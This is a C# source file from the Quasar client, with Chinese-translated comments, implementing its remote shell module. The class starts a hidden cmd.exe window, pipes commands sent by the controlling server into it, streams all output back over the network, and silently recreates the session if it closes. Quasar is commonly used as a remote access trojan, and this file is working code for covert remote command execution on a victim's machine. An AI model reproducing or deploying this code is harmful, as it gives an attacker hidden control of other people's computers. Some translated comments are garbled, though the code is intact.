using Quasar.Client.Networking;
using Quasar.Common.Messages;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Threading;

namespace Quasar.Client.IO
{
    /// <summary>
    /// 这个类管理着一个远程shell会话。
    /// </summary>
    public class Shell : IDisposable
    {
        /// <summary>
        /// 命令行（cmd）的过程。
        /// </summary>
        private Process _prc;

        /// <summary>
        /// 决定我们是否还应该从输出中读取。
        /// <remarks>
        /// 检测shell的意外关闭。
        /// </remarks>
        /// </summary>
        private bool _read;

        /// <summary>
        /// 读取变量的锁对象。
        /// </summary>
        private readonly object _readLock = new object();

        /// <summary>
        /// StreamReader的锁对象。
        /// </summary>
        private readonly object _readStreamLock = new object();

        /// <summary>
        /// 当前控制台的编码。
        /// </summary>
        private Encoding _encoding;

        /// <summary>
        /// 用正确的编码将命令重定向到控制台的标准输入流。
        /// </summary>
        private StreamWriter _inputWriter;

        /// <summary>
        /// 发送响应的客户端。
        /// </summary>
        private readonly QuasarClient _client;

        /// <summary>
        /// 使用给定的客户端初始化一个新的<see cref="Shell"/>类实例。
        /// </summary>
        /// <param name="client">要发送shell响应的客户端。</param>
        public Shell(QuasarClient client)
        {
            _client = client;
        }

        /// <summary>
        /// 创建一个新的shell会话。
        /// </summary>
        private void CreateSession()
        {
            lock (_readLock)
            {
                _read = true;
            }

            var cultureInfo = CultureInfo.InstalledUICulture;
            _encoding = Encoding.GetEncoding(cultureInfo.TextInfo.OEMCodePage);

            _prc = new Process
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    StandardOutputEncoding = _encoding,
                    StandardErrorEncoding = _encoding,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)),
                    Arguments = $"/K CHCP {_encoding.CodePage}"
                }
            };
            _prc.Start();

            RedirectIO();

            _client.Send(new DoShellExecuteResponse
            {
                Output = "\n>> New Session created\n"
            });
        }

        /// <summary>
        /// 启动输入和输出的重定向。
        /// </summary>
        private void RedirectIO()
        {
            _inputWriter = new StreamWriter(_prc.StandardInput.BaseStream, _encoding);
            new Thread(RedirectStandardOutput).Start();
            new Thread(RedirectStandardError).Start();
        }

        /// <summary>
        /// 读取流中的输出。
        /// </summary>
        /// <param name="firstCharRead">第一个读音是char。</param>
        /// <param name="streamReader">要读取的StreamReader。</param>
        /// <param name="isError">如果从错误流读取，则为真，否则为假。</param>
        private void ReadStream(int firstCharRead, StreamReader streamReader, bool isError)
        {
            lock (_readStreamLock)
            {
                var streamBuffer = new StringBuilder();

                streamBuffer.Append((char)firstCharRead);

                // 虽然有更多的人物需要阅读
                while (streamReader.Peek() > -1)
                {
                    // 读取队列中的字符
                    var ch = streamReader.Read();

                    // 累积在流缓冲区中读取的字符
                    streamBuffer.Append((char)ch);

                    if (ch == '\n')
                        SendAndFlushBuffer(ref streamBuffer, isError);
                }
                // 冲洗缓冲区中的任何剩余文本
                SendAndFlushBuffer(ref streamBuffer, isError);
            }
        }

        /// <summary>
        /// 将读取的输出发送给客户端。
        /// </summary>
        /// <param name="textBuffer">包含输出的内容。</param>
        /// <param name="isError">如果从错误流读取，则为真，否则为假。</param>
        private void SendAndFlushBuffer(ref StringBuilder textBuffer, bool isError)
        {
            if (textBuffer.Length == 0) return;

            var toSend = ConvertEncoding(_encoding, textBuffer.ToString());

            if (string.IsNullOrEmpty(toSend)) return;

            _client.Send(new DoShellExecuteResponse { Output = toSend, IsError = isError });

            textBuffer.Clear();
        }

        /// <summary>
        /// 从标准输出流读取。
        /// </summary>
        private void RedirectStandardOutput()
        {
            try
            {
                int ch;

                // Read()方法将阻塞，直到有东西可用为止
                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardOutput.Read()) > -1)
                {
                    ReadStream(ch, _prc.StandardOutput, false);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("session unexpectedly closed");
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                // just exit
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    _client.Send(new DoShellExecuteResponse
                    {
                        Output = "\n>> Session unexpectedly closed\n",
                        IsError = true
                    });

                    CreateSession();
                }
            }
        }

        /// <summary>
        /// 从标准错误流中读取。
        /// </summary>
        private void RedirectStandardError()
        {
            try
            {
                int ch;

                // Read()方法将阻塞，直到有东西可用为止
                while (_prc != null && !_prc.HasExited && (ch = _prc.StandardError.Read()) > -1)
                {
                    ReadStream(ch, _prc.StandardError, true);
                }

                lock (_readLock)
                {
                    if (_read)
                    {
                        _read = false;
                        throw new ApplicationException("session unexpectedly closed");
                    }
                }
            }
            catch (ObjectDisposedException)
            {
                // just exit
            }
            catch (Exception ex)
            {
                if (ex is ApplicationException || ex is InvalidOperationException)
                {
                    _client.Send(new DoShellExecuteResponse
                    {
                        Output = "\n>> Session unexpectedly closed\n",
                        IsError = true
                    });

                    CreateSession();
                }
            }
        }

        /// <summary>
        /// 执行一个shell命令。
        /// </summary>
        /// <param name="command">要执行的命令。</param>
        /// <returns>如果执行失败则为假，否则为真。</returns>
        public bool ExecuteCommand(string command)
        {
            if (_prc == null || _prc.HasExited)
            {
                try
                {
                    CreateSession();
                }
                catch (Exception ex)
                {
                    _client.Send(new DoShellExecuteResponse
                    {
                        Output = $"\n>> Failed to creation shell session: {ex.Message}\n",
                        IsError = true
                    });
                    return false;
                }
            }

            _inputWriter.WriteLine(ConvertEncoding(_encoding, command));
            _inputWriter.Flush();

            return true;
        }

        /// <summary>
        /// 将一个输入字符串的编码转换为UTF-8格式。
        /// </summary>
        /// <param name="sourceEncoding">输入字符串的源编码。</param>
        /// <param name="input">输入的字符串。</param>
        /// <returns>UTF-8格式的输入字符串。</returns>
        private string ConvertEncoding(Encoding sourceEncoding, string input)
        {
            var utf8Text = Encoding.Convert(sourceEncoding, Encoding.UTF8, sourceEncoding.GetBytes(input));
            return Encoding.UTF8.GetString(utf8Text);
        }

        /// <summary>
        /// 释放这个类所使用的所有资源。
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_readLock)
                {
                    _read = false;
                }

                if (_prc == null)
                    return;

                if (!_prc.HasExited)
                {
                    try
                    {
                        _prc.Kill();
                    }
                    catch
                    {
                    }
                }

                if (_inputWriter != null)
                {
                    _inputWriter.Close();
                    _inputWriter = null;
                }

                _prc.Dispose();
                _prc = null;
            }
        }
    }
}
